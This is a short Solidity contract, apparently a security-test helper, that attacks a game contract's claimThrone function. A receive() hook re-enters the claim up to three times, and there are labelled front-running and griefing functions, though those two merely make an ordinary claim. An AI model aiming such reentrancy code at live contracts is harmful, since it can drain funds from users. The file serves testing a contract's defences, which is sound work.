// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Game} from "../src/Game.sol";

contract AttackerContract {
    Game public target;
    uint256 public attackCount;
    bool public attacking;
    
    constructor(address payable _target) {
        target = Game(_target);
    }
    
    // Reentrancy attack through receive function
    receive() external payable {
        if (attacking && attackCount < 3) {
            attackCount++;
            try target.claimThrone{value: target.claimFee()}() {
                // Successful reentrancy
            } catch {
                // Failed reentrancy
            }
        }
    }
    
    function startReentrancyAttack() external payable {
        attacking = true;
        attackCount = 0;
        target.claimThrone{value: msg.value}();
        attacking = false;
    }
    
    function frontRunAttack(address victim) external payable {
        // Try to front-run a victim's transaction
        // Send higher gas price and claim throne first
        try target.claimThrone{value: msg.value}() {
            // Success - front-ran the victim
        } catch {
            // Failed to front-run
        }
    }
    
    function griefingAttack() external payable {
        // Try to grief by claiming throne and never letting anyone else claim
        try target.claimThrone{value: msg.value}() {
            // Now try to block others by manipulating state
        } catch {
            // Attack failed
        }
    }
    
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}